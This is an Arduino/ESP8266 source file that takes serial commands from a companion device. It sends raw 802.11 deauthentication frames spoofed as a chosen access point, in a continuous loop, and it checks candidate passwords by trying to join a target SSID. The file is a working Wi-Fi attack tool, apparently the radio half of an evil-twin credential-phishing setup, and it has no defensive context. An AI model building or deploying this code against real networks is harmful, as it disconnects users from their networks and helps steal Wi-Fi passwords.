#include <SoftwareSerial.h>
#include <ESP8266WiFi.h>

SoftwareSerial esp(D1, D2);

String readString;
bool deauthing = true;

void serialCommand(){
  readString = "";

  while (esp.available()) {
    delay(3);
    if (esp.available() > 0) {
      char c = esp.read();
      readString += c;
    }
  }

  if(readString.length() > 0){
    int seperatorIndex = readString.indexOf('|');

    String command = readString.substring(0, seperatorIndex);
    readString = readString.substring(seperatorIndex + 1);
    seperatorIndex = readString.indexOf('|');

    if(command == "deauth"){
      int channel = readString.substring(0, seperatorIndex).toInt();
      readString = readString.substring(seperatorIndex + 1);

      seperatorIndex = readString.indexOf('|');
      String mac = readString.substring(0, seperatorIndex);
      int duration = readString.substring(seperatorIndex + 1).toInt();

      deauth(channel, mac);
    }

    if(command == "validate"){
      String targetSSID = readString.substring(0, seperatorIndex);
      readString = readString.substring(seperatorIndex + 1);
      seperatorIndex = readString.indexOf('|');

      String pass = readString.substring(0, seperatorIndex);
      readString = readString.substring(seperatorIndex + 1);
      seperatorIndex = readString.indexOf('|');

      validate(targetSSID, pass);
    }

    if(command == "stopDeauthing"){ deauthing = false; }
  }
}

void deauth(const int channel, String BSSIDstr){
  deauthing = true;
  uint8_t bssid[6];
  sscanf(BSSIDstr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);

  uint8_t deauthPacket[26] = { //defining the preset for the deauthing package
      /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
      /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
      /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,//reciever (target)
      /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //source (ap)
      /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //BSSID (ap)
      /* 22 - 23 */ 0x00, 0x00, //fragment & squence number
      /* 24 - 25 */ 0x01, 0x00 //reason code (1 = unspecified reason)
    };

  for (int i = 0; i < 6; i++){ //insert the mac adres into the deauther packet
      deauthPacket[i + 10] = bssid[i];
      deauthPacket[i + 16] = bssid[i];
  }
  
  if (channel != WiFi.channel()){ wifi_set_channel(channel); delay(100); }

  int i;
  while(deauthing == true) {
    serialCommand();
    digitalWrite(D4, LOW);
    wifi_send_pkt_freedom(deauthPacket, 26, 0); //send the deauthing package
    i++;
  }
  digitalWrite(D4, HIGH);
}

void validate(const String &targetSSID, const String &pass){
  if (WiFi.status() == 3){ WiFi.disconnect();}
      WiFi.begin(targetSSID, pass);
    
      int time = millis(); int i = 0;
      while (WiFi.status() != 3 && WiFi.status() != 4 && millis() - time < 10 * 1000){ delay(250); i++; } //wait until the wifi is conected, the wrong password status is set or the timeout triggered
      esp.printf("wifiStatus|%i", WiFi.status());
      esp.printf("It took %i seconds\n", i/4);
}

void setup() {
  esp.begin(115200);

  WiFi.mode(WIFI_STA);
  pinMode(D4, OUTPUT);
  digitalWrite(D4, HIGH);
  pinMode(D3, OUTPUT);
}

void loop() {
  serialCommand();

  if(WiFi.status() == 3 && digitalRead(D3) == LOW) { digitalWrite(D3, HIGH); }
  else if(WiFi.status() != 3 && digitalRead(D3) == HIGH){ digitalWrite(D3, LOW); }
}